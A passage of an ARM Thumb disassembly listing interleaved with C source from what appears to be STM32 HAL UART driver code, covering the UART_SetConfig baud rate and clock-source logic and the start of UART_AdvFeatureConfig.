 8005540:	681a      	ldr	r2, [r3, #0]
 8005542:	4bb4      	ldr	r3, [pc, #720]	; (8005814 <UART_SetConfig+0x300>)
 8005544:	4013      	ands	r3, r2
 8005546:	68fa      	ldr	r2, [r7, #12]
 8005548:	6812      	ldr	r2, [r2, #0]
 800554a:	6a79      	ldr	r1, [r7, #36]	; 0x24
 800554c:	430b      	orrs	r3, r1
 800554e:	6013      	str	r3, [r2, #0]

  /*-------------------------- USART CR2 Configuration -----------------------*/
  /* Configure the UART Stop Bits: Set STOP[13:12] bits according
  * to huart->Init.StopBits value */
  MODIFY_REG(huart->Instance->CR2, USART_CR2_STOP, huart->Init.StopBits);
 8005550:	68fb      	ldr	r3, [r7, #12]
 8005552:	681b      	ldr	r3, [r3, #0]
 8005554:	685b      	ldr	r3, [r3, #4]
 8005556:	f423 5140 	bic.w	r1, r3, #12288	; 0x3000
 800555a:	68fb      	ldr	r3, [r7, #12]
 800555c:	68da      	ldr	r2, [r3, #12]
 800555e:	68fb      	ldr	r3, [r7, #12]
 8005560:	681b      	ldr	r3, [r3, #0]
 8005562:	430a      	orrs	r2, r1
 8005564:	605a      	str	r2, [r3, #4]
  /* Configure
  * - UART HardWare Flow Control: set CTSE and RTSE bits according
  *   to huart->Init.HwFlowCtl value
  * - one-bit sampling method versus three samples' majority rule according
  *   to huart->Init.OneBitSampling (not applicable to LPUART) */
  tmpreg = (uint32_t)huart->Init.HwFlowCtl;
 8005566:	68fb      	ldr	r3, [r7, #12]
 8005568:	699b      	ldr	r3, [r3, #24]
 800556a:	627b      	str	r3, [r7, #36]	; 0x24

  if (!(UART_INSTANCE_LOWPOWER(huart)))
 800556c:	68fb      	ldr	r3, [r7, #12]
 800556e:	681b      	ldr	r3, [r3, #0]
 8005570:	4aa9      	ldr	r2, [pc, #676]	; (8005818 <UART_SetConfig+0x304>)
 8005572:	4293      	cmp	r3, r2
 8005574:	d004      	beq.n	8005580 <UART_SetConfig+0x6c>
  {
    tmpreg |= huart->Init.OneBitSampling;
 8005576:	68fb      	ldr	r3, [r7, #12]
 8005578:	6a1b      	ldr	r3, [r3, #32]
 800557a:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 800557c:	4313      	orrs	r3, r2
 800557e:	627b      	str	r3, [r7, #36]	; 0x24
  }
  MODIFY_REG(huart->Instance->CR3, USART_CR3_FIELDS, tmpreg);
 8005580:	68fb      	ldr	r3, [r7, #12]
 8005582:	681b      	ldr	r3, [r3, #0]
 8005584:	689b      	ldr	r3, [r3, #8]
 8005586:	f423 6130 	bic.w	r1, r3, #2816	; 0xb00
 800558a:	68fb      	ldr	r3, [r7, #12]
 800558c:	681b      	ldr	r3, [r3, #0]
 800558e:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 8005590:	430a      	orrs	r2, r1
 8005592:	609a      	str	r2, [r3, #8]
  * - UART Clock Prescaler : set PRESCALER according to huart->Init.ClockPrescaler value */
  MODIFY_REG(huart->Instance->PRESC, USART_PRESC_PRESCALER, huart->Init.ClockPrescaler);
#endif /* USART_PRESC_PRESCALER */

  /*-------------------------- USART BRR Configuration -----------------------*/
  UART_GETCLOCKSOURCE(huart, clocksource);
 8005594:	68fb      	ldr	r3, [r7, #12]
 8005596:	681b      	ldr	r3, [r3, #0]
 8005598:	4aa0      	ldr	r2, [pc, #640]	; (800581c <UART_SetConfig+0x308>)
 800559a:	4293      	cmp	r3, r2
 800559c:	d126      	bne.n	80055ec <UART_SetConfig+0xd8>
 800559e:	4ba0      	ldr	r3, [pc, #640]	; (8005820 <UART_SetConfig+0x30c>)
 80055a0:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80055a4:	f003 0303 	and.w	r3, r3, #3
 80055a8:	2b03      	cmp	r3, #3
 80055aa:	d81b      	bhi.n	80055e4 <UART_SetConfig+0xd0>
 80055ac:	a201      	add	r2, pc, #4	; (adr r2, 80055b4 <UART_SetConfig+0xa0>)
 80055ae:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80055b2:	bf00      	nop
 80055b4:	080055c5 	.word	0x080055c5
 80055b8:	080055d5 	.word	0x080055d5
 80055bc:	080055cd 	.word	0x080055cd
 80055c0:	080055dd 	.word	0x080055dd
 80055c4:	2301      	movs	r3, #1
 80055c6:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055ca:	e080      	b.n	80056ce <UART_SetConfig+0x1ba>
 80055cc:	2302      	movs	r3, #2
 80055ce:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055d2:	e07c      	b.n	80056ce <UART_SetConfig+0x1ba>
 80055d4:	2304      	movs	r3, #4
 80055d6:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055da:	e078      	b.n	80056ce <UART_SetConfig+0x1ba>
 80055dc:	2308      	movs	r3, #8
 80055de:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055e2:	e074      	b.n	80056ce <UART_SetConfig+0x1ba>
 80055e4:	2310      	movs	r3, #16
 80055e6:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055ea:	e070      	b.n	80056ce <UART_SetConfig+0x1ba>
 80055ec:	68fb      	ldr	r3, [r7, #12]
 80055ee:	681b      	ldr	r3, [r3, #0]
 80055f0:	4a8c      	ldr	r2, [pc, #560]	; (8005824 <UART_SetConfig+0x310>)
 80055f2:	4293      	cmp	r3, r2
 80055f4:	d138      	bne.n	8005668 <UART_SetConfig+0x154>
 80055f6:	4b8a      	ldr	r3, [pc, #552]	; (8005820 <UART_SetConfig+0x30c>)
 80055f8:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80055fc:	f003 030c 	and.w	r3, r3, #12
 8005600:	2b0c      	cmp	r3, #12
 8005602:	d82d      	bhi.n	8005660 <UART_SetConfig+0x14c>
 8005604:	a201      	add	r2, pc, #4	; (adr r2, 800560c <UART_SetConfig+0xf8>)
 8005606:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800560a:	bf00      	nop
 800560c:	08005641 	.word	0x08005641
 8005610:	08005661 	.word	0x08005661
 8005614:	08005661 	.word	0x08005661
 8005618:	08005661 	.word	0x08005661
 800561c:	08005651 	.word	0x08005651
 8005620:	08005661 	.word	0x08005661
 8005624:	08005661 	.word	0x08005661
 8005628:	08005661 	.word	0x08005661
 800562c:	08005649 	.word	0x08005649
 8005630:	08005661 	.word	0x08005661
 8005634:	08005661 	.word	0x08005661
 8005638:	08005661 	.word	0x08005661
 800563c:	08005659 	.word	0x08005659
 8005640:	2300      	movs	r3, #0
 8005642:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005646:	e042      	b.n	80056ce <UART_SetConfig+0x1ba>
 8005648:	2302      	movs	r3, #2
 800564a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800564e:	e03e      	b.n	80056ce <UART_SetConfig+0x1ba>
 8005650:	2304      	movs	r3, #4
 8005652:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005656:	e03a      	b.n	80056ce <UART_SetConfig+0x1ba>
 8005658:	2308      	movs	r3, #8
 800565a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800565e:	e036      	b.n	80056ce <UART_SetConfig+0x1ba>
 8005660:	2310      	movs	r3, #16
 8005662:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005666:	e032      	b.n	80056ce <UART_SetConfig+0x1ba>
 8005668:	68fb      	ldr	r3, [r7, #12]
 800566a:	681b      	ldr	r3, [r3, #0]
 800566c:	4a6a      	ldr	r2, [pc, #424]	; (8005818 <UART_SetConfig+0x304>)
 800566e:	4293      	cmp	r3, r2
 8005670:	d12a      	bne.n	80056c8 <UART_SetConfig+0x1b4>
 8005672:	4b6b      	ldr	r3, [pc, #428]	; (8005820 <UART_SetConfig+0x30c>)
 8005674:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8005678:	f403 6340 	and.w	r3, r3, #3072	; 0xc00
 800567c:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 8005680:	d01a      	beq.n	80056b8 <UART_SetConfig+0x1a4>
 8005682:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 8005686:	d81b      	bhi.n	80056c0 <UART_SetConfig+0x1ac>
 8005688:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 800568c:	d00c      	beq.n	80056a8 <UART_SetConfig+0x194>
 800568e:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005692:	d815      	bhi.n	80056c0 <UART_SetConfig+0x1ac>
 8005694:	2b00      	cmp	r3, #0
 8005696:	d003      	beq.n	80056a0 <UART_SetConfig+0x18c>
 8005698:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 800569c:	d008      	beq.n	80056b0 <UART_SetConfig+0x19c>
 800569e:	e00f      	b.n	80056c0 <UART_SetConfig+0x1ac>
 80056a0:	2300      	movs	r3, #0
 80056a2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056a6:	e012      	b.n	80056ce <UART_SetConfig+0x1ba>
 80056a8:	2302      	movs	r3, #2
 80056aa:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056ae:	e00e      	b.n	80056ce <UART_SetConfig+0x1ba>
 80056b0:	2304      	movs	r3, #4
 80056b2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056b6:	e00a      	b.n	80056ce <UART_SetConfig+0x1ba>
 80056b8:	2308      	movs	r3, #8
 80056ba:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056be:	e006      	b.n	80056ce <UART_SetConfig+0x1ba>
 80056c0:	2310      	movs	r3, #16
 80056c2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056c6:	e002      	b.n	80056ce <UART_SetConfig+0x1ba>
 80056c8:	2310      	movs	r3, #16
 80056ca:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23

  /* Check LPUART instance */
  if (UART_INSTANCE_LOWPOWER(huart))
 80056ce:	68fb      	ldr	r3, [r7, #12]
 80056d0:	681b      	ldr	r3, [r3, #0]
 80056d2:	4a51      	ldr	r2, [pc, #324]	; (8005818 <UART_SetConfig+0x304>)
 80056d4:	4293      	cmp	r3, r2
 80056d6:	d17a      	bne.n	80057ce <UART_SetConfig+0x2ba>
  {
    /* Retrieve frequency clock */
    switch (clocksource)
 80056d8:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 80056dc:	2b08      	cmp	r3, #8
 80056de:	d824      	bhi.n	800572a <UART_SetConfig+0x216>
 80056e0:	a201      	add	r2, pc, #4	; (adr r2, 80056e8 <UART_SetConfig+0x1d4>)
 80056e2:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80056e6:	bf00      	nop
 80056e8:	0800570d 	.word	0x0800570d
 80056ec:	0800572b 	.word	0x0800572b
 80056f0:	08005715 	.word	0x08005715
 80056f4:	0800572b 	.word	0x0800572b
 80056f8:	0800571b 	.word	0x0800571b
 80056fc:	0800572b 	.word	0x0800572b
 8005700:	0800572b 	.word	0x0800572b
 8005704:	0800572b 	.word	0x0800572b
 8005708:	08005723 	.word	0x08005723
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 800570c:	f7fe fe6c 	bl	80043e8 <HAL_RCC_GetPCLK1Freq>
 8005710:	61f8      	str	r0, [r7, #28]
        break;
 8005712:	e010      	b.n	8005736 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005714:	4b44      	ldr	r3, [pc, #272]	; (8005828 <UART_SetConfig+0x314>)
 8005716:	61fb      	str	r3, [r7, #28]
        break;
 8005718:	e00d      	b.n	8005736 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 800571a:	f7fe fdcd 	bl	80042b8 <HAL_RCC_GetSysClockFreq>
 800571e:	61f8      	str	r0, [r7, #28]
        break;
 8005720:	e009      	b.n	8005736 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 8005722:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005726:	61fb      	str	r3, [r7, #28]
        break;
 8005728:	e005      	b.n	8005736 <UART_SetConfig+0x222>
      default:
        pclk = 0U;
 800572a:	2300      	movs	r3, #0
 800572c:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 800572e:	2301      	movs	r3, #1
 8005730:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005734:	bf00      	nop
    }

    /* If proper clock source reported */
    if (pclk != 0U)
 8005736:	69fb      	ldr	r3, [r7, #28]
 8005738:	2b00      	cmp	r3, #0
 800573a:	f000 8107 	beq.w	800594c <UART_SetConfig+0x438>
      } /* if ( (lpuart_ker_ck_pres < (3 * huart->Init.BaudRate) ) ||
                (lpuart_ker_ck_pres > (4096 * huart->Init.BaudRate) )) */
#else
      /* No Prescaler applicable */
      /* Ensure that Frequency clock is in the range [3 * baudrate, 4096 * baudrate] */
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 800573e:	68fb      	ldr	r3, [r7, #12]
 8005740:	685a      	ldr	r2, [r3, #4]
 8005742:	4613      	mov	r3, r2
 8005744:	005b      	lsls	r3, r3, #1
 8005746:	4413      	add	r3, r2
 8005748:	69fa      	ldr	r2, [r7, #28]
 800574a:	429a      	cmp	r2, r3
 800574c:	d305      	bcc.n	800575a <UART_SetConfig+0x246>
          (pclk > (4096U * huart->Init.BaudRate)))
 800574e:	68fb      	ldr	r3, [r7, #12]
 8005750:	685b      	ldr	r3, [r3, #4]
 8005752:	031b      	lsls	r3, r3, #12
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 8005754:	69fa      	ldr	r2, [r7, #28]
 8005756:	429a      	cmp	r2, r3
 8005758:	d903      	bls.n	8005762 <UART_SetConfig+0x24e>
      {
        ret = HAL_ERROR;
 800575a:	2301      	movs	r3, #1
 800575c:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 8005760:	e0f4      	b.n	800594c <UART_SetConfig+0x438>
      }
      else
      {
        usartdiv = (uint32_t)(UART_DIV_LPUART(pclk, huart->Init.BaudRate));
 8005762:	69fb      	ldr	r3, [r7, #28]
 8005764:	2200      	movs	r2, #0
 8005766:	461c      	mov	r4, r3
 8005768:	4615      	mov	r5, r2
 800576a:	f04f 0200 	mov.w	r2, #0
 800576e:	f04f 0300 	mov.w	r3, #0
 8005772:	022b      	lsls	r3, r5, #8
 8005774:	ea43 6314 	orr.w	r3, r3, r4, lsr #24
 8005778:	0222      	lsls	r2, r4, #8
 800577a:	68f9      	ldr	r1, [r7, #12]
 800577c:	6849      	ldr	r1, [r1, #4]
 800577e:	0849      	lsrs	r1, r1, #1
 8005780:	2000      	movs	r0, #0
 8005782:	4688      	mov	r8, r1
 8005784:	4681      	mov	r9, r0
 8005786:	eb12 0a08 	adds.w	sl, r2, r8
 800578a:	eb43 0b09 	adc.w	fp, r3, r9
 800578e:	68fb      	ldr	r3, [r7, #12]
 8005790:	685b      	ldr	r3, [r3, #4]
 8005792:	2200      	movs	r2, #0
 8005794:	603b      	str	r3, [r7, #0]
 8005796:	607a      	str	r2, [r7, #4]
 8005798:	e9d7 2300 	ldrd	r2, r3, [r7]
 800579c:	4650      	mov	r0, sl
 800579e:	4659      	mov	r1, fp
 80057a0:	f7fa fd1c 	bl	80001dc <__aeabi_uldivmod>
 80057a4:	4602      	mov	r2, r0
 80057a6:	460b      	mov	r3, r1
 80057a8:	4613      	mov	r3, r2
 80057aa:	61bb      	str	r3, [r7, #24]
        if ((usartdiv >= LPUART_BRR_MIN) && (usartdiv <= LPUART_BRR_MAX))
 80057ac:	69bb      	ldr	r3, [r7, #24]
 80057ae:	f5b3 7f40 	cmp.w	r3, #768	; 0x300
 80057b2:	d308      	bcc.n	80057c6 <UART_SetConfig+0x2b2>
 80057b4:	69bb      	ldr	r3, [r7, #24]
 80057b6:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 80057ba:	d204      	bcs.n	80057c6 <UART_SetConfig+0x2b2>
        {
          huart->Instance->BRR = usartdiv;
 80057bc:	68fb      	ldr	r3, [r7, #12]
 80057be:	681b      	ldr	r3, [r3, #0]
 80057c0:	69ba      	ldr	r2, [r7, #24]
 80057c2:	60da      	str	r2, [r3, #12]
 80057c4:	e0c2      	b.n	800594c <UART_SetConfig+0x438>
        }
        else
        {
          ret = HAL_ERROR;
 80057c6:	2301      	movs	r3, #1
 80057c8:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 80057cc:	e0be      	b.n	800594c <UART_SetConfig+0x438>
      } /* if ( (pclk < (3 * huart->Init.BaudRate) ) || (pclk > (4096 * huart->Init.BaudRate) )) */
#endif /* USART_PRESC_PRESCALER */
    } /* if (pclk != 0) */
  }
  /* Check UART Over Sampling to set Baud Rate Register */
  else if (huart->Init.OverSampling == UART_OVERSAMPLING_8)
 80057ce:	68fb      	ldr	r3, [r7, #12]
 80057d0:	69db      	ldr	r3, [r3, #28]
 80057d2:	f5b3 4f00 	cmp.w	r3, #32768	; 0x8000
 80057d6:	d16a      	bne.n	80058ae <UART_SetConfig+0x39a>
  {
    switch (clocksource)
 80057d8:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 80057dc:	2b08      	cmp	r3, #8
 80057de:	d834      	bhi.n	800584a <UART_SetConfig+0x336>
 80057e0:	a201      	add	r2, pc, #4	; (adr r2, 80057e8 <UART_SetConfig+0x2d4>)
 80057e2:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80057e6:	bf00      	nop
 80057e8:	0800580d 	.word	0x0800580d
 80057ec:	0800582d 	.word	0x0800582d
 80057f0:	08005835 	.word	0x08005835
 80057f4:	0800584b 	.word	0x0800584b
 80057f8:	0800583b 	.word	0x0800583b
 80057fc:	0800584b 	.word	0x0800584b
 8005800:	0800584b 	.word	0x0800584b
 8005804:	0800584b 	.word	0x0800584b
 8005808:	08005843 	.word	0x08005843
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 800580c:	f7fe fdec 	bl	80043e8 <HAL_RCC_GetPCLK1Freq>
 8005810:	61f8      	str	r0, [r7, #28]
        break;
 8005812:	e020      	b.n	8005856 <UART_SetConfig+0x342>
 8005814:	efff69f3 	.word	0xefff69f3
 8005818:	40008000 	.word	0x40008000
 800581c:	40013800 	.word	0x40013800
 8005820:	40021000 	.word	0x40021000
 8005824:	40004400 	.word	0x40004400
 8005828:	00f42400 	.word	0x00f42400
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 800582c:	f7fe fdf2 	bl	8004414 <HAL_RCC_GetPCLK2Freq>
 8005830:	61f8      	str	r0, [r7, #28]
        break;
 8005832:	e010      	b.n	8005856 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005834:	4b4c      	ldr	r3, [pc, #304]	; (8005968 <UART_SetConfig+0x454>)
 8005836:	61fb      	str	r3, [r7, #28]
        break;
 8005838:	e00d      	b.n	8005856 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 800583a:	f7fe fd3d 	bl	80042b8 <HAL_RCC_GetSysClockFreq>
 800583e:	61f8      	str	r0, [r7, #28]
        break;
 8005840:	e009      	b.n	8005856 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 8005842:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005846:	61fb      	str	r3, [r7, #28]
        break;
 8005848:	e005      	b.n	8005856 <UART_SetConfig+0x342>
      default:
        pclk = 0U;
 800584a:	2300      	movs	r3, #0
 800584c:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 800584e:	2301      	movs	r3, #1
 8005850:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005854:	bf00      	nop
    }

    /* USARTDIV must be greater than or equal to 0d16 */
    if (pclk != 0U)
 8005856:	69fb      	ldr	r3, [r7, #28]
 8005858:	2b00      	cmp	r3, #0
 800585a:	d077      	beq.n	800594c <UART_SetConfig+0x438>
    {
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate));
 800585c:	69fb      	ldr	r3, [r7, #28]
 800585e:	005a      	lsls	r2, r3, #1
 8005860:	68fb      	ldr	r3, [r7, #12]
 8005862:	685b      	ldr	r3, [r3, #4]
 8005864:	085b      	lsrs	r3, r3, #1
 8005866:	441a      	add	r2, r3
 8005868:	68fb      	ldr	r3, [r7, #12]
 800586a:	685b      	ldr	r3, [r3, #4]
 800586c:	fbb2 f3f3 	udiv	r3, r2, r3
 8005870:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 8005872:	69bb      	ldr	r3, [r7, #24]
 8005874:	2b0f      	cmp	r3, #15
 8005876:	d916      	bls.n	80058a6 <UART_SetConfig+0x392>
 8005878:	69bb      	ldr	r3, [r7, #24]
 800587a:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 800587e:	d212      	bcs.n	80058a6 <UART_SetConfig+0x392>
      {
        brrtemp = (uint16_t)(usartdiv & 0xFFF0U);
 8005880:	69bb      	ldr	r3, [r7, #24]
 8005882:	b29b      	uxth	r3, r3
 8005884:	f023 030f 	bic.w	r3, r3, #15
 8005888:	82fb      	strh	r3, [r7, #22]
        brrtemp |= (uint16_t)((usartdiv & (uint16_t)0x000FU) >> 1U);
 800588a:	69bb      	ldr	r3, [r7, #24]
 800588c:	085b      	lsrs	r3, r3, #1
 800588e:	b29b      	uxth	r3, r3
 8005890:	f003 0307 	and.w	r3, r3, #7
 8005894:	b29a      	uxth	r2, r3
 8005896:	8afb      	ldrh	r3, [r7, #22]
 8005898:	4313      	orrs	r3, r2
 800589a:	82fb      	strh	r3, [r7, #22]
        huart->Instance->BRR = brrtemp;
 800589c:	68fb      	ldr	r3, [r7, #12]
 800589e:	681b      	ldr	r3, [r3, #0]
 80058a0:	8afa      	ldrh	r2, [r7, #22]
 80058a2:	60da      	str	r2, [r3, #12]
 80058a4:	e052      	b.n	800594c <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 80058a6:	2301      	movs	r3, #1
 80058a8:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 80058ac:	e04e      	b.n	800594c <UART_SetConfig+0x438>
      }
    }
  }
  else
  {
    switch (clocksource)
 80058ae:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 80058b2:	2b08      	cmp	r3, #8
 80058b4:	d827      	bhi.n	8005906 <UART_SetConfig+0x3f2>
 80058b6:	a201      	add	r2, pc, #4	; (adr r2, 80058bc <UART_SetConfig+0x3a8>)
 80058b8:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80058bc:	080058e1 	.word	0x080058e1
 80058c0:	080058e9 	.word	0x080058e9
 80058c4:	080058f1 	.word	0x080058f1
 80058c8:	08005907 	.word	0x08005907
 80058cc:	080058f7 	.word	0x080058f7
 80058d0:	08005907 	.word	0x08005907
 80058d4:	08005907 	.word	0x08005907
 80058d8:	08005907 	.word	0x08005907
 80058dc:	080058ff 	.word	0x080058ff
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 80058e0:	f7fe fd82 	bl	80043e8 <HAL_RCC_GetPCLK1Freq>
 80058e4:	61f8      	str	r0, [r7, #28]
        break;
 80058e6:	e014      	b.n	8005912 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 80058e8:	f7fe fd94 	bl	8004414 <HAL_RCC_GetPCLK2Freq>
 80058ec:	61f8      	str	r0, [r7, #28]
        break;
 80058ee:	e010      	b.n	8005912 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 80058f0:	4b1d      	ldr	r3, [pc, #116]	; (8005968 <UART_SetConfig+0x454>)
 80058f2:	61fb      	str	r3, [r7, #28]
        break;
 80058f4:	e00d      	b.n	8005912 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 80058f6:	f7fe fcdf 	bl	80042b8 <HAL_RCC_GetSysClockFreq>
 80058fa:	61f8      	str	r0, [r7, #28]
        break;
 80058fc:	e009      	b.n	8005912 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 80058fe:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005902:	61fb      	str	r3, [r7, #28]
        break;
 8005904:	e005      	b.n	8005912 <UART_SetConfig+0x3fe>
      default:
        pclk = 0U;
 8005906:	2300      	movs	r3, #0
 8005908:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 800590a:	2301      	movs	r3, #1
 800590c:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005910:	bf00      	nop
    }

    if (pclk != 0U)
 8005912:	69fb      	ldr	r3, [r7, #28]
 8005914:	2b00      	cmp	r3, #0
 8005916:	d019      	beq.n	800594c <UART_SetConfig+0x438>
    {
      /* USARTDIV must be greater than or equal to 0d16 */
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate));
 8005918:	68fb      	ldr	r3, [r7, #12]
 800591a:	685b      	ldr	r3, [r3, #4]
 800591c:	085a      	lsrs	r2, r3, #1
 800591e:	69fb      	ldr	r3, [r7, #28]
 8005920:	441a      	add	r2, r3
 8005922:	68fb      	ldr	r3, [r7, #12]
 8005924:	685b      	ldr	r3, [r3, #4]
 8005926:	fbb2 f3f3 	udiv	r3, r2, r3
 800592a:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 800592c:	69bb      	ldr	r3, [r7, #24]
 800592e:	2b0f      	cmp	r3, #15
 8005930:	d909      	bls.n	8005946 <UART_SetConfig+0x432>
 8005932:	69bb      	ldr	r3, [r7, #24]
 8005934:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8005938:	d205      	bcs.n	8005946 <UART_SetConfig+0x432>
      {
        huart->Instance->BRR = (uint16_t)usartdiv;
 800593a:	69bb      	ldr	r3, [r7, #24]
 800593c:	b29a      	uxth	r2, r3
 800593e:	68fb      	ldr	r3, [r7, #12]
 8005940:	681b      	ldr	r3, [r3, #0]
 8005942:	60da      	str	r2, [r3, #12]
 8005944:	e002      	b.n	800594c <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 8005946:	2301      	movs	r3, #1
 8005948:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  huart->NbTxDataToProcess = 1;
  huart->NbRxDataToProcess = 1;
#endif /* USART_CR1_FIFOEN */

  /* Clear ISR function pointers */
  huart->RxISR = NULL;
 800594c:	68fb      	ldr	r3, [r7, #12]
 800594e:	2200      	movs	r2, #0
 8005950:	669a      	str	r2, [r3, #104]	; 0x68
  huart->TxISR = NULL;
 8005952:	68fb      	ldr	r3, [r7, #12]
 8005954:	2200      	movs	r2, #0
 8005956:	66da      	str	r2, [r3, #108]	; 0x6c

  return ret;
 8005958:	f897 3022 	ldrb.w	r3, [r7, #34]	; 0x22
}
 800595c:	4618      	mov	r0, r3
 800595e:	3728      	adds	r7, #40	; 0x28
 8005960:	46bd      	mov	sp, r7
 8005962:	e8bd 8fb0 	ldmia.w	sp!, {r4, r5, r7, r8, r9, sl, fp, pc}
 8005966:	bf00      	nop
 8005968:	00f42400 	.word	0x00f42400

0800596c <UART_AdvFeatureConfig>:
  * @brief Configure the UART peripheral advanced features.
  * @param huart UART handle.
  * @retval None
  */
void UART_AdvFeatureConfig(UART_HandleTypeDef *huart)
{
 800596c:	b480      	push	{r7}
 800596e:	b083      	sub	sp, #12
 8005970:	af00      	add	r7, sp, #0
 8005972:	6078      	str	r0, [r7, #4]
  /* Check whether the set of advanced features to configure is properly set */
  assert_param(IS_UART_ADVFEATURE_INIT(huart->AdvancedInit.AdvFeatureInit));

  /* if required, configure RX/TX pins swap */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_SWAP_INIT))
 8005974:	687b      	ldr	r3, [r7, #4]
 8005976:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005978:	f003 0308 	and.w	r3, r3, #8
 800597c:	2b00      	cmp	r3, #0
 800597e:	d00a      	beq.n	8005996 <UART_AdvFeatureConfig+0x2a>
  {
    assert_param(IS_UART_ADVFEATURE_SWAP(huart->AdvancedInit.Swap));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_SWAP, huart->AdvancedInit.Swap);
 8005980:	687b      	ldr	r3, [r7, #4]
 8005982:	681b      	ldr	r3, [r3, #0]
 8005984:	685b      	ldr	r3, [r3, #4]
 8005986:	f423 4100 	bic.w	r1, r3, #32768	; 0x8000
 800598a:	687b      	ldr	r3, [r7, #4]
